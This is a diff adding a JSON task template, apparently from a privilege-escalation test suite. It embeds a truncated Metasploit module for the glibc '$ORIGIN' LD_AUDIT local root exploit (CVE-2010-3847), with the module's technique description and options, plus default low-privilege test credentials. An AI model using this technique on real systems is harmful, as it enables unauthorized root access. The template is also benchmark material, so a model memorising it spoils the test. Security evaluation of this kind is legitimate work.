@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44024",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: glibc - '$ORIGIN' Expansion Privilege Escalation (Metasploit) (CVE-2010-3847)\n\nExploit source code (44024.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core/exploit/local/linux'\nrequire 'msf/core/exploit/exe'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"glibc '$ORIGIN' Expansion Privilege Escalation\",\n      'Description'    => %q{\n        This module attempts to gain root privileges on Linux systems by abusing\n        a vulnerability in the GNU C Library (glibc) dynamic linker.\n\n        glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not\n        properly restrict use of the LD_AUDIT environment variable when loading\n        setuid executables which allows control over the $ORIGIN library search\n        path resulting in execution of arbitrary shared objects.\n\n        This module opens a file descriptor to the specified suid executable via\n        a hard link, then replaces the hard link with a shared object before\n        instructing the linker to execute the file descriptor, resulting in\n        arbitrary code execution.\n\n        The specified setuid binary must be readable and located on the same\n        file system partition as the specified writable directory.\n\n        This module has been tested successfully on glibc version 2.5 on CentOS\n        5.4 (x86_64), 2.5 on CentOS 5.5 (x86_64) and 2.12 on Fedora 13 (i386).\n\n        RHEL 5 is reportedly affected, but untested. Some versions of ld.so,\n        such as the version shipped with Ubuntu 14, hit a failed assertion\n        in dl_open_worker causing exploitation to fail.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Tavis Ormandy', # Discovery and exploit\n          'Brendan Coles'  # Metasploit\n        ],\n      'DisclosureDate' => 'Oct 18 2010',\n      'Platform'       => 'linux',\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64 } ]\n        ],\n      'DefaultTarget'  => 0,\n      'References'     =>\n        [\n          [ 'CVE', '2010-3847' ],\n          [ 'BID', '44154' ],\n          [ 'EDB', '15274' ],\n          [ 'URL', 'http://seclists.org/fulldisclosure/2010/Oct/257' ],\n          [ 'URL', 'https://www.ubuntu.com/usn/usn-1009-1' ],\n          [ 'URL', 'https://security-tracker.debian.org/tracker/CVE-2010-3847' ],\n          [ 'URL', 'https://access.redhat.com/security/cve/CVE-2010-3847' ]\n        ]\n    ))\n    register_options(\n      [\n        OptString.new('SUID_EXECUTABLE', [ true, 'Path to a suid executable', '/bin/ping' ]),\n        OptString.new('WritableDir',     [ true, '\n```",
+  "cve": "CVE-2010-3847",
+  "exploitdb_id": "44024",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44024",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
